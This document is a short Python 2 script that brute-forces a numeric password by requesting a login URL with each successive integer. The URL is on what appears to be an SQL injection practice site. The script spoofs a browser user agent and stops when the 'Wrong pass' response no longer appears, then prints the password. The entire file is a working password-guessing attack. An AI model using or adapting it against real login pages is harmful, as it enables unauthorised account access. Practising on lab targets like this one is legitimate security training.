#!/usr/bin/python

import pycurl
import StringIO
import re

i = 0
p = re.compile('Wrong pass')

url = 'http://www.zixem.altervista.org/SQLi/login_do.php?pass='

c = pycurl.Curl()
c.setopt(pycurl.USERAGENT, 'Mozilla/5.0')

while 1:
	c.setopt(pycurl.URL, url + str(i))
	b = StringIO.StringIO()
	c.setopt(pycurl.WRITEFUNCTION, b.write)
	c.setopt(pycurl.FOLLOWLOCATION, 1)
	c.setopt(pycurl.MAXREDIRS, 5)
	c.perform()
	content = b.getvalue()
	m = p.findall(content)
	if m:
		print '[-] ' + str(i) + " : " + m[0]
		i = i + 1
	else:
		print '[+] ' + str(i) + ' : Found!!!'
		break

print '[+] The password is : ' + str(i)